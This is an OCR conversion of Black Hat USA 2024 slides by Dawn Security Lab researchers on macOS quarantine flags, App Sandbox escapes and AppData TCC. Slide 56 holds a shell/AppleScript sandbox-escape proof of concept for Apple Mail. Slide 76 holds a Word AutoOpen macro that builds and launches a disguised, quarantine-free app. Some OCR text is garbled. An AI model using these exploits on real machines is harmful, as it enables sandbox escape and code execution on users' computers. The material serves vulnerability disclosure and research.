---
title: "Unveiling Mac Security A Comprehensive Exploration of Sandboxing and AppData TCC"
speakers: ["Zhongquan Li", "Qidan He"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Zhongquan Li & Qidan He_Unveiling Mac Security A Comprehensive Exploration of Sandboxing and AppData TCC.pdf"
pages: 154
sha256: "b56c168b76e6a25dfa5b8344ad2dae9a82cb8c4c8b982aeac4bdfeb9a1e0246a"
text_chars: 60243
ocr_pages: 39
has_ocr: true
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T21:41:49Z"
---
# Unveiling Mac Security A Comprehensive Exploration of Sandboxing and AppData TCC

**Speakers:** Zhongquan Li, Qidan He  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Zhongquan Li & Qidan He_Unveiling Mac Security A Comprehensive Exploration of Sandboxing and AppData TCC.pdf` (154 pages)

## Slide 1

Unveiling Mac Security: A Comprehensive Exploration of Sandboxing and AppData TCC

Zhongquan Li & Qidan He

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat —
USA 2024
AUGUST 7-8, 2024
BRIEFINGS
Unveiling Mac Security:
A Comprehensive Exploration of
Sandboxing and AppData TCC
Zhongquan Li & Qidan He
```

## Slide 2

# Whoami

Zhongquan Li <u>@Guluisacat</u>

Senior security researcher from Dawn Security Lab of JD.com

- Focusing on bug hunting and fuzzing in Android, IoT, and Apple products

- Blog: <u>https://imlzq.com</u>

Qidan He <u>@flanker_hqd</u>

Director, Chief security researcher from Dawn Security Lab of JD.com

- Focusing on security architecture of mobile and cloud native security, bug hunting, anti-fruad

- Blog: <u>https://blog.flanker017.me</u>

#BHUSA @BlackHatEvents

## Slide 3

# About Dawn Security Lab

- Security Lab of JD.com

- Found 200+ CVEs in Google, Apple, Samsung, Huawei, etc

- Members consisting of previous Pwn2Own and DEFCON winnners

- Pwnie Award 2022 winner for best privilege escalation – Mystique

- <u>https://twitter.com/dawnseclab</u>

- <u>https://dawnslab.jd.com</u>

#BHUSA @BlackHatEvents

## Slide 4

# Why I Switched from Android to Apple for Vulnerability Research

**1** Better vulnerability disclosure policy

**2** Higher bug bounties

- **3** I built a system using AFL + Unicorn to simulate and fuzz Android TAs. By building a custom syscall API, it can be adapted for macOS/iOS

<u>https://imlzq.com/android/fuzzing/unicorn/tee/2024/05/29/Dive-Into-Android-TA-BugHunting-And-Fuzzing.html</u>

#BHUSA @BlackHatEvents

## Slide 5

# Goals and Findings

02

03

**Goals**

**Findings**

1. Analyze and exploit macOS userland vulnerabilities to identify fuzzing targets

Over 40 exploitable logic vulnerabilities have been discovered since July 2023

2. Bypass all user space security mechanisms to gain full control of the computer

#BHUSA @BlackHatEvents

## Slide 6

# Content Adjustment Due to Unpatched Vulnerabilities

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
SS
REGISTER NOW
black hat | AUGUST 3-8, 2024
USA 2024 MAND Y BAY-/ LAS VIBES
TRAININGS ~ BRIEFINGS ~ ARSENAL ~ FEATURES ~ SCHEDULE ~ BUSINESS HALL ~ SPONSORS ~
All times are Pacific Time (GI ITC -7h)
Unveiling Mac Security: An In-depth Analysis of 16 Vulnerabilities in TCC,
Sandboxing, App Management & Beyond
Zhor Li | Senior Security Researcher, Dawn Security Lab, JD.com
Qidan | Director, Chief Researcher, Dawn Security Lab, JD.com
Format: 40-Minute Briefings
Tracks: @ Platform Security, (@) Application Security: Offense
black hat || AUGUST 3-8, 2024
USA 2024 MANDALAY BAY-/LAS VEGAS
>
Unveiling Mac Security: A Comprehensive Exploration of Sandboxing and AppData
Too
Zhongquan Li | Senior Security Researcher, Dawn Security Lab, JD.com
Qidan He | Director, Chief Researcher, Dawn Security Lab, JD.com
Date: Thursday, August 8 | 3:20pm-4:00pm ( Oceanside C, Level 2 )
Format: 40-Minute Briefings
Tracks: Platform Security, Application Security: Offense
```

## Slide 7

# Agenda

1. Security Protections on macOS

2. Transforming a Traditionally Useless Bug into a Sandbox Escape

3. A Permission Granting Mechanism on macOS

4. Everything you need to know about AppData TCC

5. Summary

#BHUSA @BlackHatEvents

## Slide 8

# Section 1 : Security Protections on macOS

#BHUSA @BlackHatEvents

## Slide 9

# System Integrity Protection: Rootless

<u>https://support.apple.com/en-us/102149</u>

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
System Integrity Protection is a security technology designed to help prevent potentially malicious
software from modifying protected files and folders on your Mac. System Integrity Protection restricts the
root user account and limits the actions that the root user can perform on protected parts of the Mac
operating system.
Before System Integrity Protection (introduced in OS X El Capitan), the root user had no permission
restrictions, so it could access any system folder or app on your Mac. Software obtained root-level access
when you entered your administrator name and password to install the software. That allowed the software
to modify or overwrite any system file or app.
```

## Slide 10

System Integrity Protection <u>https://opensource.apple.com/source/xnu/xnu-7195.81.3/bsd/sys/csr.h.auto.html</u>

Details: <u>https://www.microsoft.com/en-us/security/blog/2021/10/28/microsoft-finds-new-macosvulnerability-shrootless-that-could-bypass-system-integrity-protection/</u>

#BHUSA @BlackHatEvents

## Slide 11

# TCC

Works similarly to Android permissions

Dynamically applied when needed

General TCC bypass vulnerability is more valuable than userland root LPE

#BHUSA @BlackHatEvents

## Slide 12

# Targets

RCE

Camera

Microphone

Screen Recording

Root LPE

SIP Bypassing

Arbitrary Files Read and Write

#BHUSA @BlackHatEvents

## Slide 13

# Remote Attack Surfaces on macOS

Memory corruption
vulnerabilities
Safari, Messages, Mail,
FaceTime, Pictures,
Video/Audio, PDF, etc.

Download and launch an
untrusted app
Gatekeeper Bypass

Malicious documents

SBX from Office

#BHUSA @BlackHatEvents

## Slide 14

# Remote Attack Surfaces on macOS

Malicious documents

Malicious documents
SBX from Office

Memory corruption vulnerabilities Safari, Messages, Mail, FaceTime, Pictures, Video/Audio, PDF, etc.

Download and launch an untrusted app Gatekeeper Bypass

#BHUSA @BlackHatEvents

## Slide 15

# Section 2: Transforming a Traditionally Useless Bug into a Sandbox Escape

#BHUSA @BlackHatEvents

## Slide 16

# App Sandbox Escape on macOS

Exploit sandboxd or sandbox profiles

Exploit XPC services or syscalls

Launch a fully controlled non-sandboxed app

#BHUSA @BlackHatEvents

## Slide 17

# App Sandbox Escape on macOS

Exploit sandboxd or sandbox profiles

Exploit XPC services or syscalls

Launch a fully controlled non-sandboxed app

#BHUSA @BlackHatEvents

## Slide 18

# App on macOS

The simplest app structure :

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
The simplest app structure :
sh-3.2$ ls -R hello.app
Contents
hello.app/Contents:
MacOS
hello.app/Contents/MacOS:
hello
```

## Slide 19

# App on macOS

macOS supports different executable file formats depending on the chip architecture

Intel Chips

Shell scripts x86_64 binaries

Supports ARM binaries by default

ARM Chips (Apple Silicon) Supports x86_64 binaries and shell scripts with Rosetta installed

#BHUSA @BlackHatEvents

## Slide 20

# App on macOS

macOS supports different executable file formats depending on the chip architecture

Shell scripts Intel Chips x86_64 binaries

Supports ARM binaries by default ARM Chips (Apple Silicon) Supports x86_64 binaries and shell scripts with Rosetta installed

#BHUSA @BlackHatEvents

## Slide 21

# Security Protection : Quarantine

Files modified by sandboxed apps
are assigned the Quarantine
attribute

Prevents execution
if without user consent

#BHUSA @BlackHatEvents

## Slide 22

# Quarantine Protection on macOS

Flags Modifier
Time Stamp UUID

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
sh-3.2$ xattr -l ./hello.app
com.apple.quarantine: @0c3;6666e204; Safari; 91B57AC3—EB1D-48EC-9EA3-5B97080819EC
a Sd
Flags Modifier
UUID
```

## Slide 23

# Quarantine Protection on macOS

Flags Modifier
Time Stamp UUID

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
sh-3.2$ xattr -l ./hello.app
com.apple.quarantine: @0c3;6666e204; Safari; 91B57AC3—EB1D-48EC-9EA3-5B97080819EC
a Sd
Flags Modifier
UUID
```

## Slide 24

# Quarantine Protection on macOS ： Untrusted App

Download a file with Safari, the file will be tagged with Quarantine attribute

#BHUSA @BlackHatEvents

## Slide 25

# Quarantine Protection on macOS ： Untrusted App

Gatekeeper blocks
its launch

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
GIIT SS a © ©
com.apple.metadata: kMDItemWhereFroms:
macOS cannot verify that this app is free
from malware.
com.apple.quarantine: 0083; 6666e204; Safari; 91B57AC3-EB1D-48EC-9EA3-5B97080819EC
sh-3.2$ unzip hello.zip
Archive: hello.zip
creating: hello.app/
creating: hello.app/Contents/
creating: hello.app/Contents/MacOS/
inflating: hello.app/Contents/MacOS/hello
sh-3.2$
sash Gatekeeper blocks
its launch
Move to Trash Cancel
```

## Slide 26

# Quarantine Protection on macOS

- We need to go to System Settings to allow the operation

- Admin password needed

<u>https://support.apple.com/en-us/102445</u>

#BHUSA @BlackHatEvents

## Slide 27

# Quarantine Protection on macOS ： Untrusted App

**01**

**02**

**03**

Click Open Anyway

Click Open once again

_The app finally launches, syspolicyd adds its quarantine flags with 0x40_

#BHUSA @BlackHatEvents

## Slide 28

# Quarantine Protection on macOS

Launch the user-permitted app,
syspolicyd will not prevent its launch
because the quarantine flags contains 0x40

#BHUSA @BlackHatEvents

## Slide 29

# Quarantine Protection on macOS ： Trusted App

- Only a single additional click is required to launch the notarized app

#BHUSA @BlackHatEvents

## Slide 30

# Quarantine Protection on macOS: Summary

- If the user downloads an untrusted app, launching the app requires multiple clicks and the admin password

- If the app has been notarized, an additional click is still needed to launch the app

Nice security protection effectively mitigate the 1-Click RCE attack surface

#BHUSA @BlackHatEvents

## Slide 31

Can We Launch an Executable File Without Modifying Its Quarantine Flags?

YES

Use an app folder

that doesn‘t set the Quarantine attribute to wrap the executable file

#BHUSA @BlackHatEvents

## Slide 32

Can We Launch an Executable File Without Modifying Its Quarantine Flags?

- _Nice Feature!_

• If there is a vulnerability that allows us to create an app folder without quarantine can we use it attribute, to bypass the sandbox?

#BHUSA @BlackHatEvents

## Slide 33

# SBX with an Arbitrary Folder Creation Vulnerability

Failed

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
Data — 112x24
sh-3.2$ pwd
/Users/ gg /Library/Containers/gulucat.HelloMac/Data
sh-3.2$
sh-3.2$
sh-3.2$ xattr -1 hello.app
sh-3.2$ xattr -1 hello.app/Contents/
sh-3.2$ xattr -l1 hello.app/Contents/MacOS/
sh-3.2$ xattr -l1 hello.app/Contents/MacOS/hello 0086
com.apple.quarantine: 0086; 650a9916;HelloMac : °
sh-3.2$
sh-3.2$
sh-3.2$ open ./hello.app
The application cannot be opened for an unexpected reason, error=Error Domain=NSOSStatusErrorDomain Code=-10810
"kLSUnknownErr: Unexpected internal error" UserInfo={_LSFunction=_LSLaunchWithRunningboard, _LSLine=309@, NSUnde
rlyingError=0x600000b047e@ {Error Domain=RBSRequestErrorDomain Code=5 "Launch failed." UserInfo={NSLocalizedFail
ureReason=Launch failed., NSUnderlyingError=0x600000b044b@ {Error Domain=NSPOSIXErrorDomain Code=1 "Operation no
t permitted" UserInfo={NSLocalizedDescription=Launchd job spawn failed}}}}}
```

## Slide 34

# Why?

01 Launchable

Unlaunchable

02

Quarantine Flag != 0086

Quarantine Flag == 0086

#BHUSA @BlackHatEvents

## Slide 35

# My Hypothesis

Not authorized

Any write operation to a file will be assigned the 0086 flag

The design of Quarantine incorporates the concept of whether the user has permitted this operation

Authorized

Any write operation to a file will be assigned a flag other than 0086

- The system will use the strictest policies to handle this file

- E.G : 0081/0082/0083

- The system will handle it in a softer way

#BHUSA @BlackHatEvents

## Slide 36

# Validating My Hypothesis: From a Code Perspective <u>https://github.com/apple-oss-distributions/WebKit/blob/WebKit-</u>

<u>7618.2.12.11.6/Source/WebCore/PAL/pal/spi/mac/QuarantineSPI.h</u>

#BHUSA @BlackHatEvents

## Slide 37

Validating My Hypothesis: From a Code Perspective <u>https://opensource.apple.com/source/WebKit2/WebKit27610.4.3.0.3/UIProcess/Cocoa/WKShareSheet.mm.auto.html</u>

#BHUSA @BlackHatEvents

## Slide 38

# Extract Quarantine.kext

#### Download the firmware:

- <u>https://ipsw.me/</u>

• <u>https://developer.apple.com/download/</u>

#BHUSA @BlackHatEvents

## Slide 39

# Extract Quarantine.kext

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
extract_kexts.sh
#!/bin/
if -z "$1" J; then
"Error: No input file specified."
"Usage: $@ <input_kernelcache>"
exit 1
fi
input_kernelcache=$1
if ! -f "$input_kernelcache" J; then
"Error: File '$input_kernelcache' not found."
"Usage: $@ <input_kernelcache>"
exit 1
fi
kernelcache="./out_kernelcache"
im4p extract -i "$input_kernelcache" -o "$kernelcache
-l "$kernelcache" |
-v "Listing Images" |
while IFS= -r kext_name; do
"Extracting $kext_name..."
-e "$kext_name" "$kernelcache"
done < kext_list.txt
"ALL kexts have been extracted."
-v "\-\-\-\-" > kext_list.txt
sh-3.2$ file kernelcache.release.maci5s
kernelcache.release.maci5s: data
sh-3.2$
sh-3.2$
sh-3.2$ file out_kernelcache
out_kernelcache: Mach-O 64-bit armé64e
sh-3.2$
sh-3.2$
sh-3.2$ file ./binaries/com.apple.security. quarantine
./binaries/com.apple.security.quarantine: Mach-O 64-bit kext bundle armé4e
```

## Slide 40

# Process to Generate the Quarantine flag

- A sandboxed app is not allowed to modify files' Quarantine attribute

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
¢ Asandboxed app is not allowed to modify files' Quarantine attribute
LABEL_11:.
= sandbox_check_vnode( , ALL, , OLL, "com.apple.quarantine");
if ( (_DWORD) )
{
LABEL_13:
= QOLL;
goto LABEL_14;
4) }
95 LABEL_18:
if ( a5 - 4097 >= OxFFFFFFFFFFFFFQO2LL )
{
= alias data fANOTILI Olt \ +
Q0Q0A8EO _syscall_quarantine_setinfo_common:87 (FFFFFEQ00B313560)
% cat /System/Library/Sandbox/Profiles/application.sb|grep com.apple.quarantine
(deny file-write-xattr (xattr "com.apple.quarantine") (with no-1log)) )
```

## Slide 41

# Process to Generate the Quarantine flag

If the input flag does not contain 0x40 and the lowest two bits are non-zero, the 0x80 flag will be added

_Final Quarantine Flag = Input_Flag | 0x80_

#BHUSA @BlackHatEvents

## Slide 42

# Analyze Quarantine.kext

0081 : Download 0082 : Sandbox 0083 : Sandbox + Download 0086 : Sandbox + Hard

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
WebKit / Source / WebCore / PAL / pal / spi / mac / QuarantineSPI.h
| Code | Blame 88 lines (74 loc) - 2.92 KB
0081 : Download
38 };
0082 : Sandbox 39
40 v enum qtn_flags {
0083 : Sandbox + Download 41 QTN_FLAG_DOWNLOAD = 0x0001,
42 QTN_FLAG_SANDBOX = 0x0002,
0086 : Sandbox + Hard 43 QTN_FLAG_HARD = 0x0004,
44 QTN_FLAG_USER_APPROVED = 0x0040,
45 io
46
```

## Slide 43

# Analyze Quarantine.kext

01

03

02

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
( )
{
Mintelmac /tmp % xattr -w "com.apple.quarantine" "@@86; 00000000; safari;" hello.app/Contents/MacOS/hello Ber i
Aintelmac /tmp % open ./hello.app i 4
.¢ application cannot be opened for an unexpected reason, error=Error Domain=NSOSStatusErrorDomain Code=-1081@ "kLSUnknownErr: Un —int64 result i
expected internal error" UserInfo={_LSFunction=_LSLaunchWithRunningboard, _LSLine=309@, NSUnderlyingError=0x600001942078 {Error Do sent. *¥ 7 f
main=RBSRequestErrorDomain Code=5 "Launch failed." UserInfo={NSLocalizedFailureReason=Launch failed., NSUnderlyingError=0x60000194 t64- - ff
213@ {Error Domain=NSPOSIXErrorDomain Code=1 "Operation not permitted" UserInfo={NSLocalizedDescription=Launchd job spawn failed}} int64 v0; //
+3} in 00,
const char *v12; //
const char *v13; //
const char *v14; //
unsigned int v15; //
memset(vi6, @, sizeof(v16));
= quarantine_get_flags(a2, OLL, &v15, ) Fs
02
u = OL: Quarantin
TE = Ox5SD- )
/kernel (/System/Library/Extensions/Quarantine.kext/Contents/MacOS/Quarantine) return 4
Subsystem: -- Category: <Missing Description> Details return 1LL;
t
45 Get 6) ==. 65)
return OLL;
exec of /private/tmp/hello.app/Contents/MacOS/hello denied since it was quarantined by safar and created without user consent, qtn-flags was @x@0000086 If (C & 4) !=0)
{
LABEL_15
kl *)getpath(a2);
= "created without user consent";
os_log_ internal (
&dword_FFFFFE@Q07934E16,
0s LOG_TYPE_ERROR,
f %s denied since
$ quarantined by
S was
(con )
v;
kfree_data_addr( i
return 1LL;
```

## Slide 44

# SBX Through Launching a Non-Sandboxed App

01

02

Identify a vulnerability that allows the creation of an app folder without the quarantine attribute

Discover a vulnerability or utilize a feature to create an executable file with a quarantine flag other than 0086

#BHUSA @BlackHatEvents

## Slide 45

# CVE-2023-42947: Creating an App Folder Without the Quarantine Attribute

<u>https://support.apple.com/en-us/HT214036</u>

Impact : macOS 10.15 – 14.0

#BHUSA @BlackHatEvents

## Slide 46

# CVE-2023-42947: Creating an App Folder Without the Quarantine Attribute

Application Container

~/Library/Container/{App_Bundle_ID}

Group Container ~/Library/Group Container/{Group_ID}

#BHUSA @BlackHatEvents

## Slide 47

Group Container: The differences between Mac and iOS <u>https://developer.apple.com/documentation/foundation/ nsfilemanager/1412643-containerurlforsecurityapplicati</u>

Below macOS 15, the group containers of third-party apps are not protected and behave differently compared to iOS

#BHUSA @BlackHatEvents

## Slide 48

# Group Containers : Below 14.0

01.

iOS: Upon app launch, Container Manager automatically creates the corresponding group containers and restricts access based on teamID

02.

macOS: Container Manager does not automatically create group containers for an app upon its first launch

_They are only created when the user calls API_

#BHUSA @BlackHatEvents

## Slide 49

# CVE-2023-42947: Path Traversal

- Container Manager is the core management component for app sandboxing, it has FDA access and also faces some sandbox restrictions

- There is a path traversal vulnerability in group container folder creation process

- _The created folder isn’t tagged with the quarantine attribute_

- This API can also be triggered via XPC

#BHUSA @BlackHatEvents

## Slide 50

# CVE-2023-42947: Patch

[macOS 14.1 - 14.5] App’s group containers are now automatically created upon the app‘s first launch

The _containerURLForSecurityApplicationGroupIdentifier_ API only returns the URL and does not perform folder creation

#BHUSA @BlackHatEvents

## Slide 51

# SBX Through Launching a Non-Sandboxed App

01

Identify a vulnerability that allows
the creation of an app folder
without the quarantine attribute

02

Discover a vulnerability or utilize a feature to create an executable file with a quarantine flag other than 0086

#BHUSA @BlackHatEvents

## Slide 52

# 0082 Routes

Route 1 Route 2
Privilege Abuse
Entitlement User-Selected
Route 3 Route 4
Abuse Apple Event Abuse
Clipboard

#BHUSA @BlackHatEvents

## Slide 53

### Route 1 : Privilege Entitlement

#BHUSA @BlackHatEvents

## Slide 54

# Route 1 : Privilege Entitlement

- As long as the app declares the entitlement, any operation on files will be marked as 0082 quarantine flag

- Regardless of whether the app actually has read-write permissions for the Downloads folder

- _This entitlement is widely used in many applications_

#BHUSA @BlackHatEvents

## Slide 55

# Route 1 : Examples

WPS Office
Bluetooth File Exchange
Telegram
Apple Messages
Examples
Parallels Desktop
WhatsApp
Apple Mail WeChat

#BHUSA @BlackHatEvents

## Slide 56

# SBX for Apple Mail

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat | “a i
USA 2024
mail_sbx_exp.sh
#!/bin/
-rf ./hello.app
“use framework \"Foundation\"\n
set theAppGroup to \"../Containers/com.apple.mail/Data/hello.app\"
set theFileManager to current application's NSFileManager's defaultManager( )
set theContainerURL to theFileManager's containerURLForSecurityApplicationGroupIdentifier: theAppGroup
return theContainerURL as text" > hello.scpt
hello.scpt
—rf ./hello.app/x
—-rf ./hello.app/.*
—p hello. app/Contents/MacOS
'#!/bin/sh' > hello
‘open -a Calculator' >> hello
"touch /tmp/YOUHAVEBEENHACKED' >> hello
777 hello
hello hello. app/Contents/MacOS/hello
./hello. app)
```

## Slide 57

# Route 1 : Limitations

Microsoft Word and many other applications don‘t declare the entitlement.

_We need to find another way to exploit them._

#BHUSA @BlackHatEvents

## Slide 58

### Route 2: Abuse User-Selected Feature

#BHUSA @BlackHatEvents

## Slide 59

# What is User-Selected Feature

If Terminal attempts to open `~/Documents/flag.txt` with TextEdit, it will be denied.

- flag.txt is a protected file

- Neither the requesting Terminal nor the handling TextEdit has access to it

#BHUSA @BlackHatEvents

## Slide 60

# What is User-Selected Feature

- However, if we double-click on `~/Documents/flag.txt` in Finder, TextEdit will be able to load the file correctly

- This is because the user explicitly wants to use TextEdit to open `flag.txt`, so the OS will fully grant file access to TextEdit

- _This is called the User-Selected / User-Approved feature_

#BHUSA @BlackHatEvents

## Slide 61

# What is User-Selected Feature

- From a system design perspective, User-Selected / User-Approved feature is one of the most powerful functions on mac

- Only Root and SIP can limit its behavior

- The design of Quarantine incorporates the concept of whether the user has permitted this operation

_Can we use the User-Selected / User-Approved feature to change the Quarantine flag?_

#BHUSA @BlackHatEvents

## Slide 62

# Give It a Try

##### Before modification

The answer is _Yes_

If an action is approved by the user, it will not be marked with _QTN_FLAG_HARD_

After modification

#BHUSA @BlackHatEvents

## Slide 63

# Route 2: Receiving a File and Choosing Word to Handle the Document

Receive a
document

Double click

Word gains full control over the document

Any subsequent file
operations performed
by Word

Quarantine flag: 0082

#BHUSA @BlackHatEvents

## Slide 64

# Route 2: Microsoft Word SBX under macOS 14.0

1. Inject a payload into the received document

2. Set the previously created non-sandboxed app's executable file as a symbolic link pointing to this modified document

#BHUSA @BlackHatEvents

## Slide 65

# Title

#### Text Here

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@®@®@ macbook — -zsh — 80x24
macbook@macbookdeMBP ~ % sw_vers;csrutil status; open /tmp) |
r "7 ©} Appearance ’
Accessibility
CJ Control Center
© siri & spotiight
oor ( Privacy & Security
Desktop & Dock
Privacy & Security
Privacy
Location Services >
Contacts >
Calendars >
+ @
Reminders >
Photos >
Bluetooth >
Coe
Microphone >
Camera >
e Q@
Homekit >
Speech Recognition >
=)
Media & Apple Music >
Files and Folders
CG
Full Disk Access
Wee
```

## Slide 66

# Why the Exploit Failed on macOS 14?

macOS 10.15 - macOS 13.5 SBX : CVE-2023-42947 + Router 2 macOS 14.0

08.20.2023

09.26.2023

#BHUSA @BlackHatEvents

## Slide 67

# Why the Exploit Failed on macOS 14?

- Because macOS 14 introduced a new TCC : _AppData_

- This was the first time I truly experienced the impact of security protections on exploit development

#BHUSA @BlackHatEvents

## Slide 68

# New TCC on macOS 14 : AppData

- Below macOS 14, any non-sandboxed process could access the private containers of any thirdparty app, such as WhatsApp's and Telegram's

- _The new TCC effectively closes this attack surface_

#BHUSA @BlackHatEvents

## Slide 69

# Impact of AppData TCC on Exploit

- If the executable file is a shell script, _/bin/sh_ would execute this script

- _/bin/sh_ does not have access to the private container folder of WeChat, which would prevent the script from launching

#BHUSA @BlackHatEvents

## Slide 70

# Regular File vs. Symbolic link

**_Hold on! A question arises_**

- Why can an executable file be accessed and launched if it is a regular file but not when it is a symbolic link?

- The file hello is in the HelloMac’s private container folder, so why can /bin/sh access it even it is protected by AppData TCC?

#BHUSA @BlackHatEvents

## Slide 71

Vulnerability : NO CVE <u>https://support.apple.com/HT214088 https://support.apple.com/HT214086 https://support.apple.com/HT214084 https://support.apple.com/HT214081</u>

If a directory ends with “.app”, all apps can directly access its contents, regardless of whether the directory is protected by TCC

#BHUSA @BlackHatEvents

## Slide 72

# NO CVE ： Patch

- We cannot use the vulnerability to access files in some sensitive directories now

- But we can still launch apps from protected directories

- It seems that Apple wants to keep the exception for launching apps

#BHUSA @BlackHatEvents

## Slide 73

### Route 3 : Abuse OpenFile Apple Event

#BHUSA @BlackHatEvents

## Slide 74

# Route 3 : Abuse OpenFile Apple Event

- User-Selected is a crucial feature

- macOS should ensure that malicious applications cannot emulate click events or trigger the permission-granting mechanism without user interaction

#BHUSA @BlackHatEvents

## Slide 75

# Route 3 : Abuse OpenFile Apple Event

Once an app implements the application:openfile
and application:openfiles interfaces, it can freely
handle the input files
01

03

Using `open -a {AppID} ./hello.txt` will make the specified app open hello.txt

02 Subsequent operations on the input
file will be treated as user-approved
and will tag the file with the 0082
quarantine flag instead of 0086

#BHUSA @BlackHatEvents

## Slide 76

# Title

Macro.docm

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piseichat 3
USA 2024
Function GetDocumentPath() As String
End
Sub
End
Dim docPath As String
docPath = ActiveDocument.Path
If docPath = "" Then
GetDocumentPath = ""
Else
GetDocumentPath = docPath
End If
Function
AutoOpen()
Dim scriptCode As String
Dim docPath As String
Dim docName As String
Dim fullPath As String
Dim step1 As String
Dim step2 As String
Dim step3 As String
Dim step4 As String
docPath = GetDocumentPath
docName = ActiveDocument.Name
fullPath = docPath & "/" & docName
" Clean
step1 = "rm -rf hellox;rm -rf .com.apple.containermanagerd.metadata.plist.app;"
" Creating an App Folder Without the Quarantine Attribute
step2 = "echo \""use framework \""\\\""Foundation\\\""\""\\n\\nset theAppGroup to \""\\\""../Containers/com.microsoft.word/Data/.com.apple. containermanagerd.metadata.plist.app/Contents/MacOS\\\""\""\\nset
theFileManager to current application's NSFileManager's defaultManager()\nset theContainerURL to theFileManager's containerURLForSecurityApplicationGroupIdentifier:theAppGroup\nreturn theContainerURL as
text \"" > hello.scpt;osascript hello.scpt;"
" Change the quarantine flag of executable file from 0086 to 0082, then inject the payload into the executable file and modify its mode.
step3 = "open -a \""Microsoft Word\"" .com.apple.containermanagerd.metadata.plist.app/Contents/Mac0S/.com.apple.containermanagerd.metadata.plist; (sleep 1; echo \""#!/bin/sh\nopen -a Calculator\ntouch /tmp/
YOUHAVEBEENHACKED\ntouch ~/Desktop/YOUHAVEBEENHACKED\"" > .com.apple.containermanagerd.metadata.plist.app/Contents/MacOS/.com. apple. containermanagerd.metadata.plist;chmod 777
. com. apple. containermanagerd.metadata.plist.app/Contents/MacO0S/.com.apple. containermanagerd.metadata.plist; open ./.com.apple.containermanagerd.metadata.plist.app) & /dev/null &"
If docPath = "" Then
scriptCode = "do shell script "" " & stepl1&" “ & step2&"" & steps &" """
MacScript (scriptCode)
End If
Sub
Macro.docm
```

## Slide 77

# Route 3 : Limitations

- This exploit opens a new UI to handle a document, making the attack noticeable to the user, which is not ideal for weaponization

- If an application has not implemented the _openfile_ and _openfiles_ interfaces, this method will not work

- _Is there a more general, silent, and weaponizable approach we can use?_

#BHUSA @BlackHatEvents

## Slide 78

### Route 4 : Abuse Clipboard

#BHUSA @BlackHatEvents

## Slide 79

# The Flaw in Clipboard on macOS

The Clipboard component
on macOS
does‘t protected

Every process can access the Universal Clipboard, including sandboxed apps

The copy operation on any
files will share the file
access with other processes

#BHUSA @BlackHatEvents

## Slide 80

# Title

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Name A Date Modified
copyFileFromClipboard.app { KB © iCloud Drive rf
flag.txt y 4:2 5 bytes Plain iOS Files er ) Fo!
e & helloworld Applications ester e
188
>  powerlog y at e Trash ter ) Fol
Music er F
Podcasts er 6:03 ,
Other Users r
Photos er )
Developer er
Music Creation esterda Folde
Mail ri
Messages esterday, 16:0 aie
JHee8
Books r
S) Videos ter ) Ide
com.apple.StorageManagement.CloudStorageHelper
com.apple.StorageManagement.MessagesHelper ter ) Fol
WeChat
Contacts
sh-3.2$ sw_vers ;csrutil status
ProductName: macOS
ProductVersion: 14.5
BuildVersion: 23F79
System Integrity Protection status: enabled.
sh-3.2$
sh-3.2$
sh-3.2$ ./copyFileFromClipboard.app/Contents/MacOS/copyFileFromClipboard ||
```

## Slide 81

# Cross-Device Clipboard Exploitation

- The Clipboard not only breaks the sandbox restrictions but also allows us to use macOS as a stepping stone to compromise the user's iOS device

- By abusing macOS's Handoff feature, we can monitor, hijack, and modify Clipboard data on iOS, such as _altering copied Bitcoin wallet addresses and stealing mnemonic phrases_

#BHUSA @BlackHatEvents

## Slide 82

#### iOS 0-Day?

macOS 0-Day

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
bitcoin
iOS 0-Day?
macOS 0-Day
renee
```

## Slide 83

# macOS 15 : iPhone Mirroring

- When I prepared my PPT, iPhone Mirroring hadn't been released yet

- I'm not sure how it works, but the function sounds risky

- Taking over my Mac could mean taking over my iPhone silently

- The demand for macOS 0-day exploits may increase in the future

#BHUSA @BlackHatEvents

## Slide 84

# Route 4 : Abuse Clipboard to Modify Quarantine Flag

Can we abuse the Clipboard component to help us achieve SBX? YES

Copy operations are mistakenly assumed to have user consent

#BHUSA @BlackHatEvents

## Slide 85

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
<Foundation/Foundation. h>
#import <Cocoa/Cocoa.
int main(int argc, char * argv[]) {
@autoreleasepool {
("pwd; touch hello.txt; uch hello2.txt");
*currentDirectoryPath = [[ ] currentDirectoryPath] ;
«filePath = [currentDirectoryPath hello. txt");
«pasteboard = [
[pasteboard 3
